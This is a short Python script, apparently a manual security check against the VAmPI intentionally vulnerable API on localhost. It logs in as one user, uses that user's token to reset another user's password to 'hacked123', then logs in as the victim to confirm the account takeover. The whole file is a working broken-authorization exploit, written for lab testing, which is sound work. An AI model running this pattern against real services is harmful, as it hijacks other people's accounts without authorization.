"""Manual check for unauthorized password change on VAmPI.

Logs in as name2, then tries to change name1's password without
owning name1's account, using name2's own token.
"""

import requests

BASE_URL = "http://localhost:5000"

# 1. Log in as name2 (not name1)
login = requests.post(
    f"{BASE_URL}/users/v1/login",
    json={"username": "name2", "password": "pass2"},
)
headers = {"Authorization": f"Bearer {login.json()['auth_token']}"}

# 2. Try to change name1's password, using name2's token
response = requests.put(
    f"{BASE_URL}/users/v1/name1/password",
    json={"password": "hacked123"},
    headers=headers,
)
print("Status code:", response.status_code)
print("Response:", response.text or "(empty body)")

# 3. Confirm by logging in as name1 with the new password
confirm = requests.post(
    f"{BASE_URL}/users/v1/login",
    json={"username": "name1", "password": "hacked123"},
)
print("\nLogin as name1 with new password, status:", confirm.status_code)